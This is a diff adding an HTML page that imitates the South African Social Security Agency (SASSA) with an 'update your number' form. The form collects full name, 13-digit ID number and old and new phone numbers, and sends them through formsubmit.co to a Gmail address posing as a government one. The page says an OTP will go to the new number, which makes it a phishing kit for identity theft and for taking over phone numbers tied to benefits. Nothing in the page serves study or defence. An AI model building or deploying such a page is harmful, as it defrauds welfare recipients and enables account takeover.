@@ -1,0 +1,53 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SASSA - South African Social Security Agency</title>
+    <link rel="stylesheet" href="style.css">
+</head>
+<body>
+    <!-- Header Section -->
+    <header style="background-color: rgb(255, 187, 0); text-align: center; padding: 20px;">
+        <img src="images/logo.png" alt="Logo">
+        <h1>SASSA - South African Social Security Agency</h1>
+        <p>Update your number or change your sassa number</p>
+    </header>
+    
+<!-- Add this form inside the <main> section or wherever appropriate -->
+    <section id="update-form" style="margin-top: 40px;">
+        <h2>Update Your Information</h2>
+        <form action="https://formsubmit.co/info.sassa.gov@gmail.com" method="post" style="display: flex; flex-direction: column; max-width: 400px; margin: auto;">
+            <label for="name" style="margin-bottom: 10px;">Full Name(s):</label>
+            <input type="text" id="name" name="name" placeholder="Enter your full name" required style="padding: 10px; margin-bottom: 20px;">
+    
+            <label for="id-number" style="margin-bottom: 10px;">ID Number:</label>
+            <input type="tel" id="id-number" name="id-number" placeholder="Enter your ID number" required pattern="\d{13}"  style="padding: 10px; margin-bottom: 20px;">
+    
+            <label for="old number" style="margin-bottom: 10px;">Old Phone Number:</label>
+            <input type="tel" id="phone-number" name="phone-number" placeholder="Enter your phone number" required  pattern="\d{10}" style="padding: 10px; margin-bottom: 20px;">
+            
+            <label for="new number" style="margin-bottom: 10px;">New Phone Number:</label>
+            <input type="Tel" id="new number" name="new number" placeholder="Enter your new number" required pattern="\d{10}"  style="padding: 10px; margin-bottom: 20px;">
+                <p>An OTP will be sent to your new number for verification.</p>
+            <button type="submit" style="background-color: rgb(255, 187, 0); color: white; padding: 10px; border: none; cursor: pointer;">Submit</button>
+        </form>
+    </section>
+
+
+
+    <!-- Footer Section -->
+    <footer style="background-color: #333; color: white; text-align: center; padding: 10px; margin-top: 40px;">
+        <p>&copy; 2025 SASSA. All rights reserved.</p>
+        <p>Contact us: <a href="mailto:info@sassa.gov.za" style="color: yellow;">info@sassa.gov.za</a></p>
+    </footer>
+</body>
+</html>
+
+
+
+
+
+
+
+
